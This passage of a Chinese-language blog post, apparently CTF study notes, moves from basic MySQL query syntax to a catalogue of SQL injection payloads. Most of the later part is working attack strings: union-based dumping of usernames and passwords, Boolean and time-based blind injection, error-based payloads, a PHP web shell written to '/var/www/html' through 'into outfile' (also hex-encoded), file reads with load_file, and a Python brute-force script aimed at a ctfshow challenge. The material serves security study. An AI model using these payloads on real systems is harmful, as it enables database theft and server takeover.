class="keyword">in</span></span><br><span class="line"><span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">not</span> <span class="keyword">in</span>(<span class="number">5</span>,<span class="number">8</span>);</span><br><span class="line">指查找出 id不等于<span class="number">5</span> 和 id不等于<span class="number">8</span> 的用户的密码</span><br><span class="line">注：不是 <span class="number">5</span><span class="operator">~</span><span class="number">8</span>，<span class="keyword">in</span>之后不是一个区间 </span><br><span class="line"></span><br><span class="line"># <span class="keyword">like</span></span><br><span class="line"><span class="number">1.</span><span class="operator">%</span> 代表任意多个字符</span><br><span class="line"><span class="number">2.</span>_ 代表任意一个字符</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%b%&#x27;</span>;</span><br><span class="line">指查找出用户名中带有字母b的用户名</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;_a%&#x27;</span>;</span><br><span class="line">指查找出用户名中带第二个字母为a的用户名</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%b&#x27;</span>;</span><br><span class="line">指查找出用户名中带最后一个字母为b的用户名</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%\_%&#x27;</span>;</span><br><span class="line">指查找出用户名中带有下划线_的用户名</span><br><span class="line">注：特殊字符需要转义</span><br><span class="line"></span><br><span class="line"># <span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名；</span><br><span class="line">注：默认为升序排列</span><br><span class="line">指定升序：<span class="keyword">asc</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名 <span class="keyword">asc</span>；</span><br><span class="line">指定降序：<span class="keyword">desc</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名 <span class="keyword">desc</span>；</span><br><span class="line">双重需求：</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名<span class="number">1</span> <span class="keyword">desc</span>,字段名<span class="number">2</span> <span class="keyword">asc</span>；</span><br><span class="line"></span><br><span class="line"># 分组函数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"></span><br><span class="line"># 空处理函数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(ifnull(salary,<span class="number">0</span>)<span class="operator">*</span><span class="number">12</span>), <span class="keyword">from</span> crew;</span><br><span class="line">求一年的薪水之和，当薪水为<span class="keyword">NULL</span>时，被当作<span class="number">0</span>来处理</span><br><span class="line"></span><br><span class="line"># <span class="built_in">count</span>(<span class="operator">*</span>) 与 count</span><br><span class="line"><span class="built_in">count</span>(<span class="operator">*</span>) :统计总记录条数，而不是统计某个字段中的数据，与字段无关</span><br><span class="line"><span class="built_in">count</span>(具体的某个字段)：统计具体字段中不为<span class="keyword">NULL</span>的总数</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>字符串数据 sum,avg 为 <span class="number">0</span>，max,min 按字母大小取</span><br><span class="line"><span class="number">2.</span>分组函数会自动忽略 <span class="keyword">NULL</span></span><br><span class="line"><span class="number">3.</span>数学运算 中如果有<span class="keyword">NULL</span>参与，结果为定为<span class="keyword">NULL</span></span><br><span class="line"><span class="number">4.</span>分组函数不能直接出现在 <span class="keyword">where</span> 后面，原因是 <span class="keyword">group</span> <span class="keyword">by</span> 是在<span class="keyword">where</span>语句执行结束之后执行的</span><br><span class="line"><span class="number">5.</span>分组函数可组合使用</span><br><span class="line"></span><br><span class="line"># <span class="keyword">group</span> <span class="keyword">by</span> 与 <span class="keyword">having</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span>：按照某个字段或某些字段进行分组</span><br><span class="line"><span class="keyword">having</span>：对分组之后的数据进行再次过滤，即<span class="keyword">having</span> 必须跟在 <span class="keyword">group</span> <span class="keyword">by</span> 后面使用</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(grade) <span class="keyword">from</span> students <span class="keyword">group</span> <span class="keyword">by</span> classes;</span><br><span class="line">先根据班级分组，再查出各个班级的成绩最高学生的成绩</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>分组函数一般与 <span class="keyword">group</span> <span class="keyword">by</span> 联合使用，并且任何一个分组函数（count,sum,avg,max,min）都是在 <span class="keyword">group</span> <span class="keyword">by</span> 语句执行结束后才会执行</span><br><span class="line"><span class="number">2.</span>当一条<span class="keyword">sql</span>语句没有 <span class="keyword">group</span> <span class="keyword">by</span> 时，整张表会自成一组</span><br><span class="line"><span class="number">3.</span>当<span class="keyword">sql</span>语句中使用<span class="keyword">group</span> <span class="keyword">by</span>时，<span class="keyword">select</span>之后只能跟参与分组的字段或者分组函数</span><br><span class="line">注：实际上在 mysql 中，可以使用并且执行，但毫无意义；而由于 Oracle 比 Mysql 要更加严格，在 Oracle 中是绝对严格不能使用的。</span><br><span class="line"></span><br><span class="line"># <span class="keyword">distinct</span> 去重</span><br><span class="line"><span class="keyword">distinct</span> 关键字  去除重复记录</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> job <span class="keyword">from</span> company;</span><br><span class="line">查询该公司中的工作岗位</span><br><span class="line"></span><br><span class="line"># 语句执行顺序</span><br><span class="line"><span class="keyword">select</span>     <span class="number">5</span>号：挑选出满足条件的数据</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span>       <span class="number">1</span>号：定表</span><br><span class="line"></span><br><span class="line"><span class="keyword">where</span>      <span class="number">2</span>号：过滤原始数据</span><br><span class="line"></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span>   <span class="number">3</span>号：进行分组</span><br><span class="line"> 	</span><br><span class="line"><span class="keyword">having</span>     <span class="number">4</span>号：对数据进行再次过滤</span><br><span class="line"></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>   <span class="number">6</span>号：进行排序</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># inner join</span></span><br><span class="line">select a.ename,b.dname from emp a join dept b on a.deptno=b.deptno;</span><br><span class="line"></span><br><span class="line"><span class="comment"># left/right join</span></span><br><span class="line">select dname,ename from dept a left join emp b on a.deptno=b.deptno;</span><br></pre></td></tr></table></figure>

<h2 id="四、union-联合注入-单引号闭合字符型为例"><a href="#四、union-联合注入-单引号闭合字符型为例" class="headerlink" title="四、union 联合注入(单引号闭合字符型为例)"></a>四、union 联合注入(单引号闭合字符型为例)</h2><p>注入判断</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>order by 查列</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; order by x--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> order by x<span class="comment">#</span></span><br><span class="line"><span class="comment"># 其中x输入数字代表哪一列，使用二分法缩小范围,x之后是两个减号与加号，代表注释</span></span><br></pre></td></tr></table></figure>

<p>判断回显位置，三列为例</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,2,3--+</span></span><br><span class="line"><span class="string">?id=0&#x27;</span> union select 1,2,3--+</span><br><span class="line">?id=1<span class="string">&#x27; and 1=2 union select 1,2,3--+</span></span><br><span class="line"><span class="string"># 前面是为了否定 id=1 时的回显，防止人家的 sql 语句只 limit 0,1 </span></span><br><span class="line"><span class="string"># 这样就无法查看到我们想要的信息了</span></span><br></pre></td></tr></table></figure>

<p>回显位置注入 sql 语句</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,(select database()),3--+</span></span><br></pre></td></tr></table></figure>

<p>查库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+</span></span><br></pre></td></tr></table></figure>

<p>查某一个库中的表</p>
<p><code>注意：仅仅是查当前数据库 database() 的表，由于处于当前数据库下，是不能查看其它数据库中数据的</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),3--+</span></span><br></pre></td></tr></table></figure>

<p>查列</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,(select group_concat(column_name) from information_schema.collumns where table_name=&#x27;</span>users<span class="string">&#x27; and table_schema=&#x27;</span>security<span class="string">&#x27;),3--+</span></span><br></pre></td></tr></table></figure>

<p>查内容，<code>~</code> 连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,(select group_concat(concat_ws(&#x27;</span>~<span class="string">&#x27;,username,password))from security.users),3--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 同时查三列数据的话</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union select 1,group_concat(id,<span class="string">&#x27;--&#x27;</span>,username,<span class="string">&#x27;--&#x27;</span>,password),3 from users<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="五、Boolean-盲注"><a href="#五、Boolean-盲注" class="headerlink" title="五、Boolean 盲注"></a>五、Boolean 盲注</h2><h3 id="5-1-手动：结合-Burp-爆破进行"><a href="#5-1-手动：结合-Burp-爆破进行" class="headerlink" title="5.1 手动：结合 Burp 爆破进行"></a>5.1 手动：结合 Burp 爆破进行</h3><p>查数据库长度</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and length(database())=1--+</span></span><br><span class="line"><span class="string"># 爆破数字 1</span></span><br></pre></td></tr></table></figure>

<p>判断库名组成     security</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and left(database(),1)=&#x27;</span>a<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"># 爆破字母 a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and ascii(substr(database(),1,1))=<span class="string">&#x27;b&#x27;</span>--+</span><br><span class="line"><span class="comment"># 爆破 ascii 值 b</span></span><br></pre></td></tr></table></figure>

<p>查表         users</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit a,1),1,1)) =&#x27;</span>b<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"># 同时爆破数字a,和 数字b，其中 b 是 ascii 值</span></span><br></pre></td></tr></table></figure>

<p>查列        username   password</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and ascii(substr((select column_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27; limit a,1),1,1)) = &#x27;</span>b<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"># 同时爆破数字a,和 数字b，其中 b 是 ascii 值</span></span><br></pre></td></tr></table></figure>

<p>查内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and ascii(substr((select username from security.users limit a,1),1,1))=&#x27;</span>b<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"># 爆破 ascii 值 b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and ascii(substr((select password from security.users <span class="built_in">limit</span> 0,1),1,1))=<span class="string">&#x27;b&#x27;</span>--+</span><br><span class="line"><span class="comment"># 爆破 ascii 值 b</span></span><br></pre></td></tr></table></figure>

<h3 id="5-2-脚本"><a href="#5-2-脚本" class="headerlink" title="5.2 脚本"></a>5.2 脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="六、五大报错注入"><a href="#六、五大报错注入" class="headerlink" title="六、五大报错注入"></a>六、五大报错注入</h2><p><strong>利用条件</strong>：页面回显 SQL语句执行的错误信息，例如 <code>mysql_error()</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="built_in">floor</span>()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>  (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span>  information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># extractvalue()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()))))</span><br></pre></td></tr></table></figure>

<p><strong>updatexml()</strong> 函数：</p>
<p>这个函数的第二个参数本应该是合法的 <code>XPATH</code> 路径，否则就会在引发报错的同时将传入的参数进行输出。我们利用这个特征，当题目存在回显时，将我们想的到的信息传入这个函数的第二个参数即可查询。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># updatexml()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">0x3a</span>,concat(<span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">1</span>)))</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="built_in">exp</span>()</span><br><span class="line">id <span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">EXP</span>(<span class="operator">~</span>(<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a))</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 六种函数 (使用方法相同)</span><br><span class="line"></span><br><span class="line">GeometryCollection()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> GeometryCollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">polygon()</span><br><span class="line">id <span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multipoint()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multilinestring()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">linestring()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> LINESTRING((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multipolygon()</span><br><span class="line">id <span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure>

<h2 id="七、文件读写"><a href="#七、文件读写" class="headerlink" title="七、文件读写"></a>七、文件读写</h2><h3 id="7-1-手动"><a href="#7-1-手动" class="headerlink" title="7.1 手动"></a>7.1 手动</h3><p><strong>写文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,&quot;&lt;?php @eval(\$_POST[1]); ?&gt;&quot;,3 into outfile &quot;/var/www/html/1.php&quot;--+</span></span><br><span class="line"><span class="string"># 可将文件内容转换成十六进制</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union select 1,0x3c3f70687020406576616c28245f504f53545b315d293b203f3e,3 into outfile <span class="string">&quot;/var/www/html/1.php&quot;</span>--+</span><br></pre></td></tr></table></figure>

<p><strong>有回显时 读取文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,2,load_file(&#x27;</span>/var/www/html/1.php<span class="string">&#x27;)--+</span></span><br><span class="line"><span class="string"># 文件路径 可使用 十六进制</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union select 1,2,load_file(0x2f7661722f7777772f68746d6c2f312e706870)--+</span><br></pre></td></tr></table></figure>

<p><strong>无回显 盲注读取文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; and ascii(mid((select hex(load_file(&#x27;</span>/var/www/html/1.php<span class="string">&#x27;))),a,1))&gt;b--+</span></span><br><span class="line"><span class="string"># 同时爆破 数字 a 和 ascii 值 b</span></span><br></pre></td></tr></table></figure>

<h3 id="7-2-脚本"><a href="#7-2-脚本" class="headerlink" title="7.2 脚本"></a>7.2 脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 八、延时注入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 8.1 手动：结合 Burp Respond</span></span><br><span class="line"></span><br><span class="line">当页面上无回显，也没有输出 SQL 语句执行错误信息。正确的 SQL 语句和错误的 SQL 语句返回页面都一样，可考虑延时注入。</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">?id=1<span class="string">&#x27; and sleep(3)--+</span></span><br></pre></td></tr></table></figure>

<p>查库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and if(length(database())=a,sleep(3),1)--+</span></span><br><span class="line"><span class="string"># 爆破数字 a</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and <span class="keyword">if</span>(ascii(substr(database(),a,1))=b,sleep(3),1)--+</span><br><span class="line"><span class="comment"># 同时爆破 数字 a 和 ascii 值 b</span></span><br></pre></td></tr></table></figure>

<p>查表</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),a,1))=b,sleep(3),1)--+</span></span><br><span class="line"><span class="string"># 同时爆破 数字 a 和 ascii 值 b</span></span><br></pre></td></tr></table></figure>

<p>查列</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27;),a,1))=b,sleep(3),1)--+</span></span><br><span class="line"><span class="string"># 同时爆破 数字 a 和 ascii 值 b</span></span><br></pre></td></tr></table></figure>

<p>查字段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and if(ascii(substr((select group_concat(username) from security.users),a,1))=b,sleep(3),1)--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and <span class="keyword">if</span>(ascii(substr((select group_concat(password) from security.users),a,1))=b,sleep(3),1)--+</span><br><span class="line"><span class="comment"># 同时爆破 数字 a 和 ascii 值 b</span></span><br></pre></td></tr></table></figure>

<h3 id="8-2-脚本"><a href="#8-2-脚本" class="headerlink" title="8.2 脚本"></a>8.2 脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 九、regexp 正则匹配</span></span><br><span class="line"></span><br><span class="line">测试</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;b$&#x27;</span>;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">| id | username | password  |</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">|  1 | Dumb     | Dumb      |</span><br><span class="line">|  3 | Dummy    | p@ssword  |</span><br><span class="line">|  5 | stupid   | stupidity |</span><br><span class="line">|  8 | admin    | admin     |</span><br><span class="line">|  9 | admin1   | admin1    |</span><br><span class="line">| 10 | admin2   | admin2    |</span><br><span class="line">| 11 | admin3   | admin3    |</span><br><span class="line">| 12 | dhakkan  | dumbo     |</span><br><span class="line">| 14 | admin4   | admin4    |</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">9 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;^a&#x27;</span>;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">6 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;admin[0-9]&#x27;</span>;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  9 | admin1   | admin1   |</span><br><span class="line">| 10 | admin2   | admin2   |</span><br><span class="line">| 11 | admin3   | admin3   |</span><br><span class="line">| 14 | admin4   | admin4   |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;.n&#x27;</span>;		<span class="comment">#.匹配任意字符</span></span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">9 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;a|b&#x27;</span>;  <span class="comment">#含有 a 或 b 的</span></span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">10 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<h3 id="9-1-手动"><a href="#9-1-手动" class="headerlink" title="9.1 手动"></a>9.1 手动</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),a,1)regexp(&#x27;</span>b<span class="string">&#x27;),1,2)=&#x27;</span>1</span><br><span class="line"><span class="comment"># 同时爆破 数字 a 和 字母 b</span></span><br></pre></td></tr></table></figure>

<h3 id="9-2-脚本"><a href="#9-2-脚本" class="headerlink" title="9.2 脚本"></a>9.2 脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://xxxxx&quot;</span></span><br><span class="line">flagstr=<span class="string">&quot; _&#123;&#125;-&quot;</span> + string.ascii_lowercase + string.digits</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,45):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;admin&#x27; and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1)regexp(&#x27;&#123;j&#125;&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;admin&#x27; and if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;i&#125;,1)regexp(&#x27;&#123;j&#125;&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        </span><br><span class="line">        payload = f<span class="string">&quot;admin&#x27; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;i&#125;,1)regexp(&#x27;&#123;j&#125;&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> == j:</span><br><span class="line">                <span class="built_in">exit</span>(0)</span><br><span class="line">            <span class="built_in">break</span></span><br></pre></td></tr></table></figure>

<h2 id="十、异或注入"><a href="#十、异或注入" class="headerlink" title="十、异或注入"></a>十、异或注入</h2><p><strong>异或</strong>：一种逻辑运算，简言之，<strong>相同为假，不同为真，NULL 与任何条件欲火结果都为 NULL</strong>，mysql 中的符号是 <strong>^  和 xor</strong>。</p>
<p>测试：</p>
